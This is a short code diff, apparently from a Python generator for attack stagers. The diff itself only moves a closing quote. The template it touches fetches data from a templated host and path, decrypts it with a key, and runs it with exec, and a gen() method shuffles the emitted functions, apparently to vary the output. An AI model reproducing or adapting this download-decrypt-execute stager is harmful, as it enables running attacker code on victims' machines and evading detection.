@@ -117,7 +117,8 @@ request = urllib.request.Request('{host}{path}')'''
 with o.open(request) as response:
     g = response.read()
     h = f(g[4:], g[:4] + '{key}'.encode('UTF-8'))
-    exec(''.join(h))'''
+    exec(''.join(h))
+'''
 
     def gen(self):
         random.shuffle(self.funcs)
